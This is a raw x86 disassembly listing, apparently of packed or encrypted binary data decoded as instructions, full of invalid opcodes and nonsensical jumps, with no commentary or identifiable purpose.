  42baea:	(bad)  
  42baeb:	stos   BYTE PTR es:[edi],al
  42baec:	mov    al,0x91
  42baee:	pop    ecx
  42baef:	fist   WORD PTR [edi]
  42baf1:	jb     0x42bb72
  42baf3:	adc    BYTE PTR [esi],ah
  42baf5:	rcl    cl,0xdc
  42baf8:	dec    ecx
  42baf9:	shl    bh,1
  42bafb:	sub    eax,0x94a77a4c
  42bb00:	mov    WORD PTR [eax-0x42],es
  42bb03:	icebp  
  42bb04:	dec    ebp
  42bb05:	ins    BYTE PTR es:[edi],dx
  42bb06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb07:	pop    es
  42bb08:	xchg   esp,eax
  42bb09:	jns    0x42bb5f
  42bb0b:	loopne 0x42bb34
  42bb0d:	cli    
  42bb0e:	aad    0x18
  42bb10:	js     0x42bac7
  42bb12:	mov    WORD PTR [ebp+ecx*2+0x2d],ds
  42bb16:	rol    dh,1
  42bb18:	mov    bh,BYTE PTR [ecx]
  42bb1a:	nop
  42bb1b:	imul   edx,DWORD PTR [ebx+0x58bb6e48],0xffffffdf
  42bb22:	xchg   edx,eax
  42bb23:	jmp    0xb3a904ed
  42bb28:	jne    0x42bae5
  42bb2a:	outs   dx,BYTE PTR ds:[esi]
  42bb2b:	sbb    eax,0x9066e768
  42bb30:	cmp    eax,0x3c2943a0
	...
  42bb95:	add    BYTE PTR [eax+ebp*1],dh
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    edi,DWORD PTR [edx*8-0x2c2088aa]
  42bba8:	add    DWORD PTR [eax],eax
  42bbaa:	pop    es
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [edi],al
  42bbaf:	jmp    FWORD PTR [ecx+0x244da873]
  42bbb5:	lock loopne 0x42bc0e
  42bbb8:	push   es
  42bbb9:	mov    dh,0x47
  42bbbb:	popf   
  42bbbc:	fdivrp st(7),st
  42bbbe:	lds    esi,FWORD PTR [edx]
  42bbc0:	loopne 0x42bc13
  42bbc2:	cmp    BYTE PTR [ebx],0x43
  42bbc5:	pop    edi
  42bbc6:	jae    0x42bb64
  42bbc8:	repz es enter 0xda47,0x6b
  42bbce:	mov    DWORD PTR [edx+ebp*1-0x6a266bff],eax
  42bbd5:	xlat   BYTE PTR ds:[ebx]
  42bbd6:	mov    dh,0x41
  42bbd8:	lds    edi,FWORD PTR [esi]
  42bbda:	hlt    
  42bbdb:	int    0xa7
  42bbdd:	push   ss
  42bbde:	sbb    BYTE PTR [ebx-0x79],ch
  42bbe1:	mov    dl,BYTE PTR [ebx+edi*2-0x27]
  42bbe5:	in     eax,0x34
  42bbe7:	jne    0x42bc03
  42bbe9:	mov    dh,0xb7
  42bbeb:	xor    ebx,DWORD PTR [ecx]
  42bbed:	std    
  42bbee:	clc    
  42bbef:	jle    0x42bc4d
  42bbf1:	jo     0x42bc29
  42bbf3:	fisubr WORD PTR [edi]
  42bbf5:	pop    es
  42bbf6:	add    cl,BYTE PTR [ebp+edi*2-0x5a7054c4]
  42bbfd:	sub    eax,0xeb47a518
  42bc02:	into   
  42bc03:	xor    eax,0x4105b0a9
  42bc08:	shr    BYTE PTR [eax+eiz*1-0x32],1
  42bc0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc0d:	call   0x67bb:0xb7afa527
  42bc14:	add    DWORD PTR [esi],ebp
  42bc16:	repz retf 
  42bc18:	ror    DWORD PTR [edi+edx*8-0x2e764262],0x69
  42bc20:	fimul  DWORD PTR [esi-0x27423302]
  42bc26:	adc    eax,0x47e6da71
  42bc2b:	(bad)  
  42bc2c:	xchg   ecx,eax
  42bc2d:	mov    edx,DWORD PTR [eax+0x2840e29b]
  42bc33:	ds in  al,0xcb
  42bc36:	mov    ebp,0x85a6d7d6
  42bc3b:	dec    eax
  42bc3c:	(bad)  
  42bc3d:	in     al,dx
  42bc3e:	jmp    0x5a4dc72c
  42bc43:	dec    ebp
  42bc44:	push   es
  42bc45:	mov    ds:0xd231ac0,eax
  42bc4a:	push   0xfffffff1
  42bc4c:	xchg   BYTE PTR fs:[eax],al
  42bc4f:	push   0xffffffa9
  42bc51:	sub    DWORD PTR [edi],0x4ae534b4
  42bc57:	push   ecx
  42bc58:	imul   edi,DWORD PTR [ebx+ecx*2],0xffffffa8
  42bc5c:	dec    esp
  42bc5d:	pop    ss
  42bc5e:	(bad)  
  42bc5f:	call   FWORD PTR [ebp+edi*8-0x37]
  42bc63:	icebp  
  42bc64:	jo     0x42bc65
  42bc66:	dec    ebp
  42bc67:	(bad)  
  42bc68:	js     0x42bc8d
  42bc6a:	jg     0x42bc1c
  42bc6c:	jg     0x42bc9e
  42bc6e:	mov    ch,0xfd
  42bc70:	mov    WORD PTR [esp+edi*1],es
  42bc73:	sar    BYTE PTR [ebx+esi*1-0x64],0xde
  42bc78:	jno    0x42bcee
  42bc7a:	jle    0x42bca4
  42bc7c:	ins    BYTE PTR es:[edi],dx
  42bc7d:	icebp  
  42bc7e:	test   DWORD PTR [esi],edi
  42bc80:	ret    0x752f
  42bc83:	fcomip st,st(1)
  42bc85:	mov    dh,0x29
  42bc87:	ja     0x42bc4a
  42bc89:	imul   edi,DWORD PTR [ebp+0x45db65e3],0x2d
  42bc90:	sbb    eax,0x1bc1bdc5
  42bc95:	fild   DWORD PTR [ecx]
  42bc97:	dec    ebp
  42bc98:	loope  0x42bc52
  42bc9a:	adc    edi,edx
  42bc9c:	aaa    
  42bc9d:	mov    fs,edi
  42bc9f:	xchg   edx,eax
  42bca0:	in     al,dx
  42bca1:	loop   0x42bc58
  42bca3:	and    al,bh
  42bca5:	pop    ebx
  42bca6:	jnp    0x42bc4f
  42bca8:	sub    eax,0xb56bb5e
  42bcad:	cmp    esi,DWORD PTR [ebx+ebx*8+0x77fdcdb1]
  42bcb4:	scas   al,BYTE PTR es:[edi]
	...
  42bd15:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	call   0xe6d558e8
  42bd27:	aam    0x1
  42bd29:	add    BYTE PTR [edi],al
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    BYTE PTR [ecx+0x32],ch
  42bd30:	iret   
  42bd31:	adc    DWORD PTR [ebx],0xa32645f7
  42bd37:	aad    0x17
  42bd39:	(bad)  
  42bd3a:	call   0xf3daa610
  42bd3f:	sbb    DWORD PTR [ecx+0x6a],edi
  42bd42:	add    esi,edx
  42bd44:	out    dx,al
  42bd45:	and    ch,ah
  42bd47:	adc    BYTE PTR [ebx+0x63],ch
  42bd4a:	retf   
  42bd4b:	add    ecx,edx
  42bd4d:	cwde   
  42bd4e:	mov    bl,0x34
  42bd50:	add    al,0xca
  42bd52:	out    0xb5,eax
  42bd54:	fidivr WORD PTR gs:[eax-0x62329798]
  42bd5b:	jmp    0x42bd7c
  42bd5d:	xchg   BYTE PTR [ebx+0x6f059921],ch
  42bd63:	mov    eax,ebx
  42bd65:	jl     0x42bd28
  42bd67:	ins    DWORD PTR es:[edi],dx
  42bd68:	add    BYTE PTR [eax],al
  42bd6a:	or     BYTE PTR [eax],ch
  42bd6c:	imul   edx,DWORD PTR [edx-0x5bb6126c],0x28d622f1
  42bd76:	jne    0x42bd8c
  42bd78:	push   esp
  42bd79:	adc    BYTE PTR [edi+0x6b3b5039],0xf
  42bd80:	icebp  
  42bd81:	clc    
  42bd82:	or     bl,BYTE PTR [edi+edi*2-0x2b]
  42bd86:	and    ebp,DWORD PTR [edi]
  42bd88:	aad    0xb2
  42bd8a:	int    0x63
  42bd8c:	push   edx
  42bd8d:	rcr    BYTE PTR [ecx-0x38],0x96
  42bd91:	cmp    al,0x94
  42bd93:	int    0xc2
  42bd95:	andps  xmm1,XMMWORD PTR [ecx]
  42bd98:	loope  0x42bdbf
  42bd9a:	test   BYTE PTR [edi],ah
  42bd9c:	xchg   esp,eax
  42bd9d:	xchg   BYTE PTR [ebx],bh
  42bd9f:	add    esi,DWORD PTR [ebp-0x79]
  42bda2:	mov    BYTE PTR [esi],bh
  42bda4:	xchg   edi,eax
  42bda5:	mov    dh,0xdd
  42bda7:	push   esi
  42bda8:	aad    0xd1
  42bdaa:	xor    ecx,edx
  42bdac:	fldenv fs:[ebp-0x3c]
  42bdb0:	mov    esi,0x106ee763
  42bdb5:	mov    eax,ds:0x341c962c
  42bdba:	inc    ebx
  42bdbb:	daa    
  42bdbc:	or     ebx,DWORD PTR ds:0x9a18d604
  42bdc2:	stos   BYTE PTR es:[edi],al
  42bdc3:	test   dl,dl
  42bdc5:	(bad)  
  42bdc7:	add    ah,BYTE PTR [edi]
  42bdc9:	xchg   DWORD PTR [esp+edi*1],eax
  42bdcc:	adc    DWORD PTR [edi-0xb],eax
  42bdcf:	(bad)  
  42bdd0:	std    
  42bdd1:	shl    edx,0x4d
  42bdd4:	sbb    edx,ebx
  42bdd6:	inc    edi
  42bdd7:	rcr    BYTE PTR [ecx],cl
  42bdd9:	sub    DWORD PTR es:[eax+0x1],ebp
  42bddd:	in     al,0xa3
  42bddf:	in     al,0x62
  42bde1:	xchg   ecx,eax
  42bde2:	shl    DWORD PTR ds:0xf968f320,0x20
  42bde9:	mov    eax,0x1bf4b404
  42bdee:	dec    ebp
  42bdef:	and    ebx,DWORD PTR [ebx]
  42bdf1:	push   edi
  42bdf2:	(bad)  
  42bdf3:	or     al,0x69
  42bdf5:	xor    dh,bh
  42bdf7:	push   ebx
  42bdf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bdf9:	pushf  
  42bdfa:	inc    eax
  42bdfb:	stos   DWORD PTR es:[edi],eax
  42bdfc:	xlat   BYTE PTR ds:[ebx]
  42bdfd:	xor    ebx,esp
  42bdff:	cs pusha 
  42be01:	push   ebx
  42be02:	mov    ebx,0x13485e1f
  42be07:	cmc    
  42be08:	adc    al,0x43
  42be0a:	or     bl,cl
  42be0c:	mov    ebp,0xc0b89631
  42be11:	stc    
  42be12:	inc    ecx
  42be13:	clc    
  42be14:	pop    ebp
  42be15:	bound  esi,QWORD PTR [ebp+0x2bf3cb3]
  42be1b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be1d:	jns    0x42bdb5
  42be1f:	sbb    al,0xb2
  42be21:	xor    dl,BYTE PTR [edi+esi*2+0x4d]
  42be25:	loopne 0x42be9b
  42be27:	call   0xb75f07c1
  42be2c:	xor    esi,DWORD PTR [eax]
  42be2e:	jo     0x42be84
  42be30:	push   eax
  42be31:	inc    edi
  42be32:	and    al,0xa6
  42be34:	leave  
	...
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	fnstsw WORD PTR [edi-0x12c43850]
  42bea7:	aad    0x1
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    BYTE PTR ds:0xddf9bc11,bl
  42beb3:	lods   al,BYTE PTR ds:[esi]
  42beb4:	arpl   WORD PTR [esi],ax
  42beb6:	mov    ah,0xbc
  42beb8:	xchg   edx,eax
  42beb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42beba:	inc    esp
  42bebb:	sbb    ch,BYTE PTR [eax]
  42bebd:	xchg   ecx,eax
  42bebe:	test   DWORD PTR [ecx-0x76],edi
  42bec1:	test   DWORD PTR es:[eax-0x1b],edi
  42bec5:	xchg   BYTE PTR [esi],al
  42bec7:	and    ch,0x23
  42beca:	jns    0x42be9e
  42becc:	xchg   ebp,eax
  42becd:	push   0x85affc0e
  42bed2:	xor    DWORD PTR [edi],0x1bb8052e
  42bed8:	mov    ecx,0x5da3e61d
  42bedd:	sbb    DWORD PTR [esi-0x3f],edi
  42bee0:	(bad)  
  42bee1:	xor    eax,0x94732032
  42bee6:	enter  0xd62,0x2d
  42beea:	mov    dx,WORD PTR [edx+edi*8+0x121f0889]
  42bef2:	xchg   ebp,eax
  42bef3:	idiv   DWORD PTR [esi+0xc]
  42bef6:	add    DWORD PTR [esi],0xed1b0572
  42befc:	jg     0x42bf45
  42befe:	sub    al,BYTE PTR [edi+edx*4-0x6e]
  42bf02:	adc    DWORD PTR [edx+0x5f],eax
  42bf05:	mov    ah,0x49
  42bf07:	arpl   WORD PTR [ebp+0x25134b35],cx
  42bf0d:	mov    edx,0xcb031406
  42bf12:	pusha  
  42bf13:	push   cs
  42bf14:	pushf  
  42bf15:	push   ecx
  42bf16:	cmp    ecx,DWORD PTR [esi+0x447a9f6e]
  42bf1c:	pop    ebx
  42bf1d:	scas   eax,DWORD PTR es:[edi]
  42bf1e:	cld    
  42bf1f:	jmp    0x42beed
  42bf21:	shl    cl,cl
  42bf23:	retf   
  42bf24:	mov    ebx,DWORD PTR [eax-0x42]
  42bf27:	add    DWORD PTR [edx+0x1a1c7d8d],ebp
  42bf2d:	adc    ebx,ebp
  42bf2f:	das    
  42bf30:	bnd je 0x42bf6f
  42bf33:	shr    edx,1
  42bf35:	je     0x42bf7c
  42bf37:	jmp    0xfc6f:0xb38e263d
  42bf3e:	pushf  
  42bf3f:	fld    DWORD PTR [esi-0x6ef6d606]
  42bf45:	xchg   DWORD PTR [edx+ebp*8],esi
  42bf48:	inc    ebp
  42bf49:	ins    BYTE PTR es:[edi],dx
  42bf4a:	mov    ds:0x83c8bd68,eax
  42bf4f:	dec    edx
  42bf50:	fisub  DWORD PTR [ebx]
  42bf52:	mov    al,0xe2
  42bf54:	aaa    
  42bf55:	jo     0x42bfad
  42bf57:	sub    DWORD PTR [eax+ebp*2],0x4dd194f1
  42bf5e:	(bad)  
  42bf5f:	sti    
  42bf60:	mov    ecx,0xeeb13949
  42bf65:	sbb    dh,BYTE PTR [bp+si-0x3ccc]
  42bf6a:	lea    esp,ss:[eax]
  42bf6d:	(bad)  
  42bf6e:	sub    edx,DWORD PTR [esi-0x6b]
  42bf71:	daa    
  42bf72:	push   cs
  42bf73:	mov    ds,WORD PTR [edx-0x48]
  42bf76:	and    DWORD PTR [edx+0x50cc6879],eax
  42bf7c:	pop    edx
  42bf7d:	jne    0x42bfaf
  42bf7f:	jb     0x42bf89
  42bf81:	mov    esi,0x63271cf7
  42bf86:	fnsave [edi+0x43]
  42bf89:	in     al,dx
  42bf8a:	outs   dx,BYTE PTR cs:[esi]
  42bf8c:	retf   
  42bf8d:	gs clc 
  42bf8f:	in     eax,dx
  42bf90:	sbb    eax,0xb68a4ab2
  42bf95:	(bad)
  42bf99:	jo     0x42bf41
  42bf9b:	and    al,0xcb
  42bf9d:	pop    esi
  42bf9e:	or     ah,dl
  42bfa0:	test   al,0xe8
  42bfa2:	into   
  42bfa3:	outs   dx,DWORD PTR ds:[esi]
  42bfa4:	mov    bh,0x92
  42bfa6:	stos   BYTE PTR es:[edi],al
  42bfa7:	xchg   dl,ah
  42bfa9:	inc    esp
  42bfaa:	dec    edx
  42bfab:	sub    BYTE PTR [edx-0x49],ch
  42bfae:	cmpxchg BYTE PTR [ebp-0x64],bh
  42bfb2:	(bad)  
  42bfb3:	imul   esp,ecx,0x0
	...
  42c015:	add    BYTE PTR [edx],bh
  42c017:	xchg   edx,eax
  42c018:	ja     0x42c04c
  42c01a:	push   edi
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0x3208f806
  42c024:	rcl    BYTE PTR [ebx-0xc],0xd6
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    ah,ah
  42c02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c030:	out    0x3a,eax
  42c032:	jle    0x42c05b
  42c034:	cli    
  42c035:	imul   eax,DWORD PTR [edx+0x5c904a68],0x4a193403
  42c03f:	int3   
  42c040:	mov    eax,ds:0x68c72528
  42c045:	pop    ds
  42c046:	imul   esi,DWORD PTR [edi],0x19
  42c049:	dec    eax
  42c04a:	arpl   WORD PTR [esi],dx
  42c04c:	dec    esi
  42c04d:	fiadd  WORD PTR [ebp+0x704b5cf2]
  42c053:	popa   
  42c054:	(bad)  
  42c055:	jns    0x42c0a9
  42c057:	out    dx,eax
  42c058:	in     al,dx
  42c059:	xchg   ebx,eax
  42c05a:	pop    es
  42c05b:	push   0x2958fbdc
  42c060:	lea    eax,[eax]
  42c062:	xchg   esi,eax
  42c063:	add    eax,0x532039d3
  42c068:	ss loopne 0x42c034
  42c06b:	pop    edx
  42c06c:	in     eax,dx
  42c06d:	inc    ebx
  42c06e:	dec    edx
  42c06f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c070:	dec    esi
  42c071:	in     eax,dx
  42c072:	push   ebp
  42c073:	fwait
  42c074:	retf   0x7e6d
  42c077:	nop
  42c078:	add    eax,0x235d2d9d
  42c07d:	aas    
  42c07e:	sub    DWORD PTR [esi],ecx
  42c080:	(bad)  
  42c081:	cwde   
  42c082:	nop
  42c083:	dec    esp
  42c084:	sbb    dh,dl
  42c086:	aaa    
  42c087:	push   ecx
  42c088:	icebp  
  42c089:	addr16 dec ebp
  42c08b:	jno    0x42c028
  42c08d:	das    
  42c08e:	mov    ecx,0x7a67636d
  42c093:	dec    ecx
  42c094:	jno    0x42c01c
  42c096:	cmp    DWORD PTR [eax+0x34],0xffffffe0
  42c09a:	xchg   esi,eax
  42c09b:	mov    dh,0xf0
  42c09d:	cld    
  42c09e:	push   ss
  42c09f:	sub    eax,0x5b8dc41e
  42c0a4:	sahf   
  42c0a5:	sbb    BYTE PTR [ebp-0x40efdd2c],dl
  42c0ab:	icebp  
  42c0ac:	and    esi,DWORD PTR [esi]
  42c0ae:	enter  0x7549,0x56
  42c0b2:	dec    eax
  42c0b3:	dec    esp
  42c0b4:	xchg   ecx,eax
  42c0b5:	adc    DWORD PTR [eax],ebp
  42c0b7:	pushf  
  42c0b8:	retf   
  42c0b9:	and    BYTE PTR [ebp-0x56ef65ab],0x1e
  42c0c0:	adc    BYTE PTR [ebx+0x65ac3fca],bh
  42c0c6:	xor    esi,esp
  42c0c8:	ror    BYTE PTR [ebx+0x59],0xe1
  42c0cc:	fidivr DWORD PTR ds:0xea730341
  42c0d2:	pop    esp
  42c0d3:	addr16 cmp eax,0xc1f3028d
  42c0d9:	cmp    eax,0x47a209f0
  42c0de:	dec    esp
  42c0df:	mov    eax,0x4accd8f8
  42c0e4:	xchg   esi,eax
  42c0e5:	call   0xdef1:0x31386d99
  42c0ec:	push   ebx
  42c0ed:	daa    
  42c0ee:	or     ecx,DWORD PTR [esi+edi*1-0xdee0cba]
  42c0f5:	out    0xb3,eax
  42c0f7:	ret    0x4c16
  42c0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0fb:	popa   
  42c0fc:	xchg   ecx,eax
  42c0fd:	ret    0xb730
  42c100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c101:	mov    ebx,0x31cde48d
  42c106:	adc    BYTE PTR [edi+0x4dc98e64],0xd2
  42c10d:	bound  esi,QWORD PTR [ebx-0x62e20edc]
  42c113:	enter  0x2048,0xce
  42c117:	jno    0x42c0d5
  42c119:	ret    0xda24
  42c11c:	inc    ecx
  42c11d:	cs pop eax
  42c11f:	ins    BYTE PTR es:[edi],dx
  42c120:	cmp    eax,0xb51c0316
  42c125:	addr16 daa 
  42c127:	out    0x21,eax
  42c129:	jg     0x42c106
  42c12b:	lock (bad) 
  42c12d:	sbb    DWORD PTR [ecx],edx
  42c12f:	outs   dx,BYTE PTR ds:[esi]
  42c130:	cmp    al,0x5c
  42c132:	mov    al,cl
  42c134:	into   
	...
  42c195:	add    BYTE PTR [ecx-0x7e],ch
  42c198:	int    0xae
  42c19a:	out    dx,eax
  42c19b:	out    dx,eax
  42c19c:	imul   eax,edi,0xffffffa4
  42c19f:	aas    
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	cwde   
  42c1a3:	in     eax,dx
  42c1a4:	imul   edi,esp,0x1d7fb
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    ah,al
  42c1af:	cld    
  42c1b0:	int3   
  42c1b1:	lahf   
  42c1b2:	mov    bl,cl
  42c1b4:	ss sbb al,0x15
  42c1b7:	test   DWORD PTR [ecx+0x44c6380e],0x153af1eb
  42c1c1:	(bad)  
  42c1c2:	mov    esp,0xcb9c684e
  42c1c7:	mov    ebx,0xdb5a229f
  42c1cc:	push   ss
  42c1cd:	xchg   edi,eax
  42c1ce:	and    ah,ah
  42c1d0:	dec    ebx
  42c1d1:	or     DWORD PTR [ebx-0x41],edx
  42c1d4:	mov    ds:0x9c3765f0,al
  42c1d9:	inc    esi
  42c1da:	jl     0x42c232
  42c1dc:	ss cmc 
  42c1de:	aad    0x29
  42c1e0:	test   dl,0x26
  42c1e3:	imul   esi,ecx,0xffffff8e
  42c1e6:	cld    
  42c1e7:	xor    ah,BYTE PTR [eax-0x5b]
  42c1ea:	push   0xcab6685c
  42c1ef:	stc    
  42c1f0:	mov    al,ds:0x2612a580
  42c1f5:	xor    BYTE PTR fs:[edi+esi*4-0x3b],ch
  42c1fa:	mov    edx,esi
  42c1fc:	pop    eax
  42c1fd:	sar    DWORD PTR [ebp+0x75],cl
  42c200:	inc    eax
  42c201:	add    al,0x90
  42c203:	or     ebp,DWORD PTR [ebp+ebp*2-0x3e]
  42c207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c208:	sub    ebx,DWORD PTR [eax]
  42c20a:	xchg   ecx,eax
  42c20b:	(bad)  
  42c20c:	sub    ebx,esp
  42c20e:	push   ebp
  42c20f:	jl     0x42c209
  42c211:	xchg   esp,eax
  42c212:	mov    dl,bh
  42c214:	cld    
  42c215:	mov    esp,0xade9a0e7
  42c21a:	inc    esi
  42c21b:	pop    eax
  42c21c:	je     0x42c1ec
  42c21e:	fs inc edi
  42c220:	pop    es
  42c221:	cli    
  42c222:	inc    ebp
  42c223:	(bad)  
  42c224:	push   edi
  42c225:	adc    BYTE PTR [edi+0x56a812ec],dl
  42c22b:	inc    edx
  42c22c:	(bad)  
  42c22e:	or     ecx,esp
  42c230:	jnp    0x42c21c
  42c232:	mov    eax,ds:0x28f81251
  42c238:	cmp    eax,0x6ac3bd3
  42c23d:	sub    ecx,DWORD PTR [edi]
  42c23f:	arpl   WORD PTR [edi],bx
  42c241:	mov    eax,0x428ca6cf
  42c246:	jo     0x42c210
  42c248:	leave  
  42c249:	add    eax,0x7e2da3a6
  42c24e:	push   ebp
  42c24f:	jmp    0x83a83c44
  42c254:	sub    BYTE PTR [esi-0x17b36d0e],bh
  42c25a:	adc    bl,dl
  42c25c:	je     0x42c276
  42c25e:	int    0xb5
  42c260:	cmp    ah,BYTE PTR [ebp-0xee0bfda]
  42c266:	lods   al,BYTE PTR ds:[esi]
  42c267:	fucomip st,st(7)
  42c269:	ror    BYTE PTR [ebp+0xcb7af3b],cl
  42c26f:	mov    gs,WORD PTR [edx-0x2d]
  42c272:	nop
  42c273:	xchg   esi,ebp
  42c275:	sub    al,0xb7
  42c278:	es push ebp
  42c27a:	(bad)  
  42c27b:	test   DWORD PTR [edi],0xffaac898
  42c281:	(bad)  
  42c282:	add    ch,ah
  42c284:	imul   bh
  42c286:	mov    ebp,0x6f5746a3
  42c28b:	xor    BYTE PTR [eax],bl
  42c28d:	loop   0x42c26e
  42c28f:	hlt    
  42c290:	xchg   ebx,esi
  42c292:	lahf   
  42c293:	in     eax,dx
  42c294:	push   eax
  42c295:	jge    0x42c243
  42c297:	lods   al,BYTE PTR ds:[esi]
  42c298:	cmc    
  42c299:	std    
  42c29a:	mov    ds:0xdd29e2c2,eax
  42c29f:	imul   esp,DWORD PTR [ebp+0x48],0xe3a92035
  42c2a6:	popa   
  42c2a7:	fisub  DWORD PTR [esi+ebx*8]
  42c2aa:	xchg   edx,eax
  42c2ab:	and    DWORD PTR [ebp+eax*4+0x1a],ebp
  42c2af:	fisttp QWORD PTR [eax-0x32]
  42c2b2:	shr    BYTE PTR [edi+0x4e],0x0
	...
  42c316:	out    0xf,al
  42c318:	fldcw  WORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    eax,ebp
  42c323:	mov    ecx,0xd902d829
  42c328:	add    DWORD PTR [eax],eax
  42c32a:	pop    es
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    BYTE PTR [edi+0x73f3c85b],ah
  42c333:	fcom   QWORD PTR [edi+0x67]
  42c336:	arpl   WORD PTR [ecx],cx
  42c338:	mov    eax,0x3828b493
  42c33d:	dec    ebx
  42c33e:	sub    al,0xe3
  42c340:	and    al,0x68
  42c342:	cli    
  42c343:	fimul  DWORD PTR [ebx]
  42c345:	xor    BYTE PTR [esi+0x8],ch
  42c348:	(bad)  
  42c349:	aaa    
  42c34a:	dec    esi
  42c34b:	mov    ah,0xce
  42c34d:	pop    ss
  42c34e:	add    al,0xf2
  42c350:	push   0x8
  42c352:	jl     0x42c38e
  42c354:	cmp    bl,BYTE PTR [ecx+0x2b8421de]
  42c35a:	push   0x2223266b
  42c35f:	or     eax,0xd5374c64
  42c364:	jmp    0x42c3b8
  42c366:	xchg   ecx,eax
  42c367:	pop    ds
  42c368:	cdq    
  42c369:	lods   al,BYTE PTR ds:[esi]
  42c36a:	mov    eax,ds:0x13af8b39
  42c36f:	jb     0x42c316
  42c371:	sbb    al,0x7f
  42c373:	jnp    0x42c3c1
  42c375:	sbb    dl,ah
  42c377:	not    DWORD PTR [edi+0x5f]
  42c37a:	enter  0xabe1,0xb8
  42c37e:	inc    edi
  42c37f:	not    DWORD PTR [ecx-0x6dbb04f]
  42c385:	popa   
  42c386:	dec    esp
  42c387:	xchg   esi,eax
  42c388:	or     DWORD PTR [eax-0x76],0xffffff8d
  42c38c:	arpl   WORD PTR [ebx-0x42d8df52],ax
  42c392:	shl    eax,cl
  42c394:	cmp    eax,0xcc6db786
  42c399:	jle    0x42c380
  42c39b:	ficom  WORD PTR [edx+eax*1+0x868ab66]
  42c3a2:	pusha  
  42c3a3:	les    ebp,FWORD PTR [eax+edx*1]
  42c3a6:	ret    
  42c3a7:	dec    ecx
  42c3a8:	dec    ecx
  42c3a9:	pushf  
  42c3aa:	mov    bh,0x2d
  42c3ac:	sahf   
  42c3ad:	pop    sp
  42c3af:	(bad)  
  42c3b0:	fild   DWORD PTR [ebp-0x669ef28b]
  42c3b6:	or     ebp,DWORD PTR [ebp-0x132ca548]
  42c3bc:	out    dx,eax
  42c3bd:	(bad)  
  42c3be:	sahf   
  42c3bf:	(bad)  
  42c3c0:	mov    ch,0x4f
  42c3c2:	add    DWORD PTR [esp+ecx*8],0xb2c98310
  42c3c9:	out    0x29,al
  42c3cb:	dec    esp
  42c3cc:	bound  esi,QWORD PTR [edi+0x67fdc736]
  42c3d2:	mov    edx,0xb2ca66af
  42c3d7:	cs in  eax,dx
  42c3d9:	fwait
  42c3da:	les    ecx,FWORD PTR [esi+ecx*2-0x74]
  42c3de:	in     eax,dx
  42c3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3e0:	mov    ch,0x6
  42c3e2:	mov    al,BYTE PTR ds:0xffa5e2bb
  42c3e8:	adc    DWORD PTR [ebp-0x45],ecx
  42c3eb:	imul   ebx,DWORD PTR [esi+0x28],0xd66011ac
  42c3f2:	sbb    al,0x79
  42c3f4:	adc    bh,BYTE PTR [edx]
  42c3f6:	or     bh,BYTE PTR [edx-0x4fe90df6]
  42c3fc:	cli    
  42c3fd:	dec    esi
  42c3fe:	mov    bl,0xc3
  42c400:	cmp    cl,bh
  42c402:	xor    DWORD PTR [edx-0x11c38421],edi
  42c408:	xchg   dh,al
  42c40a:	scas   al,BYTE PTR es:[edi]
  42c40b:	inc    esp
  42c40c:	mov    ebx,0x7afba825
  42c411:	daa    
  42c412:	scas   eax,DWORD PTR es:[edi]
  42c413:	popf   
  42c414:	inc    edx
  42c415:	pop    ebx
  42c416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c417:	out    dx,al
  42c418:	scas   al,BYTE PTR es:[edi]
  42c419:	adc    DWORD PTR [ecx],ebx
  42c41b:	(bad)  
  42c41c:	cmp    eax,DWORD PTR [ebx]
  42c41e:	dec    esp
  42c41f:	xor    al,0x5a
  42c421:	ret    
  42c422:	xor    ch,ch
  42c424:	or     ah,ah
  42c426:	or     DWORD PTR [edx],eax
  42c428:	dec    edi
  42c429:	add    eax,0x8b0a4131
  42c42e:	scas   al,BYTE PTR es:[edi]
  42c42f:	mov    bl,BYTE PTR [si+0x34]
  42c433:	push   cs
  42c434:	and    DWORD PTR [eax],eax
	...
  42c496:	in     al,dx
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    BYTE PTR [edx],cl
  42c4a3:	ja     0x42c48d
  42c4a5:	dec    ebx
  42c4a6:	or     edx,ebx
  42c4a8:	add    DWORD PTR [eax],eax
  42c4aa:	pop    es
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    BYTE PTR [edi],bl
  42c4af:	nop
  42c4b0:	dec    edx
  42c4b1:	lock mov esp,DWORD PTR [esi-0x21]
  42c4b5:	inc    esi
  42c4b6:	cmp    al,0xef
  42c4b8:	adc    ch,BYTE PTR [ecx]
  42c4ba:	mov    bh,0x35
  42c4bc:	jecxz  0x42c492
  42c4be:	stos   BYTE PTR es:[edi],al
  42c4bf:	es jbe 0x42c502
